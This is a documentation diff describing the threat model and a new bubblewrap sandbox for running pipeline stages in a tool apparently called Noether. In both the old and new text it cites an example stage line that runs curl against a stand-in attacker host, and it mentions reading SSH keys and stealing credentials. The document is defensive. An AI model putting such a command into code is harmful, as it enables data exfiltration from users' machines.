@@ -29,31 +29,76 @@ running any stage you did not write.
   Nix and the matching store paths.
 - Blocks network access during **Nix evaluation** (build time).
 
-### What it does NOT do
+### What it does NOT do by default
 
-- **It does not sandbox the subprocess.** When a stage runs, the child
-  process inherits the host user's:
-  - Filesystem access (read `~/.ssh/*`, read env files, write anywhere)
-  - Network (arbitrary outbound HTTP, DNS, raw sockets)
-  - Environment variables (all parent env is inherited)
-  - Process privileges
-- A stage can legally do `import os; os.system("curl attacker.example/...")`.
+- **It does not sandbox the subprocess** when `--isolate=none`. A stage
+  without isolation inherits the host user's filesystem access,
+  network, environment, and process privileges. A stage can legally do
+  `import os; os.system("curl attacker.example/...")`.
 - The `__direct__` venv fallback (used when a stage declares
-  `# requires:` pip packages) bypasses Nix entirely and runs in the host's
-  Python.
+  `# requires:` pip packages) bypasses Nix entirely and runs in the
+  host's Python.
+
+### What isolation adds (v0.7+)
+
+`noether run --isolate=auto` (the default from v0.7) wraps each stage
+subprocess in a sandbox. Phase 1 uses **bubblewrap** when available:
+
+- Fresh user, PID, mount, UTS, IPC, and cgroup namespaces.
+- UID and GID mapped to `nobody` (65534), so the stage can't observe
+  the invoking user's real UID and can't regain privileges via
+  `setuid(0)` — also blocked by `--cap-drop ALL`.
+- Read-only bind of `/nix/store`; a sandbox-private tmpfs as `/work`.
+  Nothing outside `/work` is writable, and the work dir leaves no
+  host-side residue.
+- Fresh network namespace unless the stage declares `Effect::Network`.
+  When network is enabled, `/etc/resolv.conf`, `/etc/hosts`,
+  `/etc/nsswitch.conf`, and `/etc/ssl/certs` are bound read-only (via
+  `--ro-bind-try`, which no-ops on systems that route those
+  differently, e.g. NixOS) so DNS and TLS actually work.
+- All Linux capabilities dropped.
+- New session (`--new-session`) so the stage can't signal the
+  invoking shell's process group.
+- Environment cleared; only an allowlist (`PATH`, `HOME`, `NIX_PATH`,
+  `NIX_SSL_CERT_FILE`, locale vars, `RUST_LOG`) is passed through —
+  and `HOME` / `USER` are overridden to sandbox-consistent values
+  (`/work` and `nobody`) so processes that rely on them see a
+  coherent identity.
+- `--require-isolation` (and `NOETHER_REQUIRE_ISOLATION=1`) turns
+  the auto-fallback-to-none warning into a hard error — use in CI
+  and production.
+
+Phase 2 (v0.8) replaces the bwrap wrapper with direct `unshare` +
+Landlock + seccomp syscalls — same policy, ~10× lower startup cost, no
+external binary. Design: `docs/roadmap/2026-04-18-stage-isolation.md`.
+
+`--isolate=none` restores legacy behaviour. It emits a loud warning
+unless `--unsafe-no-isolation` is also passed.
+
+**Caveat — nix must be installed under `/nix/store`.** The sandbox
+binds `/nix/store` and the noether cache dir only. A distro-packaged
+nix at `/usr/bin/nix` is dynamically linked against host libraries
+that aren't bound; rather than widen the bind set (which would
+re-expose suid binaries), the executor refuses to run under
+isolation in that case with a message pointing the operator at the
+upstream or Determinate nix installer.
 
 ### What this means in practice
 
-**Safe:** running stages you wrote, stages from `stdlib`, stages you read
-end-to-end before running.
+**Safe** (with the default `--isolate=auto` + bubblewrap installed):
+running stdlib stages, running LLM-synthesized stages you haven't
+audited yet, running any stage whose declared effects match what it
+actually does. The sandbox blocks filesystem escape, arbitrary
+network calls, and credential theft.
 
-**Not safe:** running a stage pulled from a registry you don't fully trust,
-running a stage synthesized by an LLM without review, running any stage on
-a host with credentials you aren't willing to risk.
+**Still risky, even with isolation**: stages declared `Effect::Network`
+can still call arbitrary URLs — the sandbox only decides whether
+network is reachable at all, not where to. Audit network-effect stages
+or run them with per-stage URL allowlisting (not yet in v0.7 — tracked
+as follow-up).
 
-**If you need isolation**, wrap the child process yourself — `bwrap`,
-`firejail`, `nsjail` with seccomp, a throwaway container, or a VM. Noether
-does not ship this. Contributions welcome.
+**Without isolation** (`--isolate=none`): same posture as pre-v0.7 —
+suitable only for stages you wrote and audited yourself.
 
 ## Composition Verification
 
